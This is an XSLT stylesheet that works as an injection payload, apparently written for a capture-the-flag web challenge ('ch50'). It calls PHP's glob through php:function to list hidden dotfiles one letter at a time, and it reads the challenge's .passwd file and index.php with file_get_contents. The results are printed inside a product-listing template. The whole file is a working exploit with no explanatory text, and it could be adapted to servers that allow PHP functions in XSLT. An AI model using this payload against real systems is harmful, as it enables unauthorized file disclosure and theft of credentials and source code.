<xsl:stylesheet version="1.0"
xmlns:xsl="http://www.w3.org/1999/XSL/Transform" 
xmlns:php="http://php.net/xsl"              
>	
<xsl:param  name="shandlea"    select="php:function('glob','/challenge/web-serveur/ch50/.a*')" disable-output-escaping="yes"/>
<xsl:param  name="shandleb"    select="php:function('glob','/challenge/web-serveur/ch50/.b*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlec"    select="php:function('glob','/challenge/web-serveur/ch50/.c*')" disable-output-escaping="yes"/>
<xsl:param  name="shandled"    select="php:function('glob','/challenge/web-serveur/ch50/.d*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlee"    select="php:function('glob','/challenge/web-serveur/ch50/.e*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlef"    select="php:function('glob','/challenge/web-serveur/ch50/.f*')" disable-output-escaping="yes"/>
<xsl:param  name="shandleg"    select="php:function('glob','/challenge/web-serveur/ch50/.g*')" disable-output-escaping="yes"/>
<xsl:param  name="shandleh"    select="php:function('glob','/challenge/web-serveur/ch50/.h*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlei"    select="php:function('glob','/challenge/web-serveur/ch50/.i*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlej"    select="php:function('glob','/challenge/web-serveur/ch50/.j*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlek"    select="php:function('glob','/challenge/web-serveur/ch50/.k*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlel"    select="php:function('glob','/challenge/web-serveur/ch50/.l*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlem"    select="php:function('glob','/challenge/web-serveur/ch50/.m*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlen"    select="php:function('glob','/challenge/web-serveur/ch50/.n*')" disable-output-escaping="yes"/>
<xsl:param  name="shandleo"    select="php:function('glob','/challenge/web-serveur/ch50/.o*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlep"    select="php:function('glob','/challenge/web-serveur/ch50/.p*')" disable-output-escaping="yes"/>
<xsl:param  name="shandleq"    select="php:function('glob','/challenge/web-serveur/ch50/.q*')" disable-output-escaping="yes"/>
<xsl:param  name="shandler"    select="php:function('glob','/challenge/web-serveur/ch50/.r*')" disable-output-escaping="yes"/>
<xsl:param  name="shandles"    select="php:function('glob','/challenge/web-serveur/ch50/.s*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlet"    select="php:function('glob','/challenge/web-serveur/ch50/.t*')" disable-output-escaping="yes"/>
<xsl:param  name="shandleu"    select="php:function('glob','/challenge/web-serveur/ch50/.u*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlev"    select="php:function('glob','/challenge/web-serveur/ch50/.v*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlew"    select="php:function('glob','/challenge/web-serveur/ch50/.w*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlex"    select="php:function('glob','/challenge/web-serveur/ch50/.x*')" disable-output-escaping="yes"/>
<xsl:param  name="shandley"    select="php:function('glob','/challenge/web-serveur/ch50/.y*')" disable-output-escaping="yes"/>
<xsl:param  name="shandlez"    select="php:function('glob','/challenge/web-serveur/ch50/.z*')" disable-output-escaping="yes"/>
<xsl:param  name="shandle_"    select="php:function('glob','/challenge/web-serveur/ch50/._*')" disable-output-escaping="yes"/>

<xsl:param  name="strscand"   select="php:function('file_get_contents','/challenge/web-serveur/ch50/.passwd')" disable-output-escaping="yes"/> 
<xsl:param  name="header"     select="php:function('file_get_contents','/challenge/web-serveur/ch50/index.php')" disable-output-escaping="yes"/>
<xsl:template match="/">	
  SCANDIR0 .u*:<xsl:value-of select="$shandleu"/> 
  SCANDIR0 .v*:<xsl:value-of select="$shandlev"/> 
  SCANDIR0 .w*:<xsl:value-of select="$shandlew"/> 
  SCANDIR0 .x*:<xsl:value-of select="$shandlex"/> 
  SCANDIR0 .y*:<xsl:value-of select="$shandley"/>  
  SCANDIR0 .z*:<xsl:value-of select="$shandlez"/> 
  SCANDIR0 .g*:<xsl:value-of select="$shandle_"/> 
  SCANDIR0 .h*:<xsl:value-of select="$shandleh"/> 
  SCANDIR0 .i*:<xsl:value-of select="$shandlei"/> 
  SCANDIR0 .j*:<xsl:value-of select="$shandlej"/>   
  SCANDIR0 .k*:<xsl:value-of select="$shandlek"/> 
  SCANDIR0 .l*:<xsl:value-of select="$shandlel"/> 
  SCANDIR0 .m*:<xsl:value-of select="$shandlem"/> 
  SCANDIR0 .n*:<xsl:value-of select="$shandlen"/> 
  SCANDIR0 .o*:<xsl:value-of select="$shandleo"/>  
  SCANDIR0 .p*:<xsl:value-of select="$shandlep"/> 
  SCANDIR0 .q*:<xsl:value-of select="$shandleq"/> 
  SCANDIR0 .r*:<xsl:value-of select="$shandler"/> 
  SCANDIR0 .s*:<xsl:value-of select="$shandles"/> 
  SCANDIR0 .t*:<xsl:value-of select="$shandlet"/>  
 PHPINFO:<xsl:value-of select="$strscand"/>     
 DIR1 index.php:<xsl:value-of select="$header"/>   
<xsl:value-of select="name"/>
 <div style="background-color:teal;color:white;padding:4px">
<span style="font-weight:bold">
-
</span>
<xsl:value-of select="price"/>
</div>
<div style="margin-left:20px;margin-bottom:1em;font-size:12pt">
<p>
<xsl:value-of select="description"/>
<span style="font-style:italic">
(
<xsl:value-of select="prct"/>
%)
</span>
</p>
</div>
</xsl:template>
</xsl:stylesheet>
